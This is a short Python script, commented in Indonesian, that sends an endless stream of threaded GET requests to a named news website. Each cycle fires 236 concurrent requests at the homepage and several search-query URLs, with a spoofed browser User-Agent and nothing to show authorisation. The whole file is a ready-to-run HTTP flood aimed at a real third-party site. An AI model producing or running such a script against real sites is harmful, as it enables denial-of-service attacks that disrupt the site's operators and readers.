# Pastikan modul 'requests' sudah terinstall.
# Jika belum, install dengan perintah:
# pip install requests

import requests
import time
import threading

# Daftar URL yang ingin di-curl
urls = [
    "https://mitraberita.net/",
    "https://mitraberita.net/?s=sdgsdgsdg",
    "https://mitraberita.net/?s=aceh&post_type=post",
    "https://mitraberita.net/?s=apa+le&post_type=post"
]

# Fungsi untuk melakukan request ke satu url
def curl(url):
    try:
        response = requests.get(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }, timeout=10)
        print(f"[{time.strftime('%H:%M:%S')}] {url} Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[{time.strftime('%H:%M:%S')}] {url} Request failed: {e}")

# Fungsi utama untuk menjalankan 59 request per detik ke semua url secara paralel
def run_curl_perdetik():
    while True:
        threads = []
        for _ in range(59):
            for url in urls:
                t = threading.Thread(target=curl, args=(url,))
                t.start()
                threads.append(t)
        # Tunggu semua thread selesai
        for t in threads:
            t.join()
        time.sleep(1)

if __name__ == "__main__":
    run_curl_perdetik()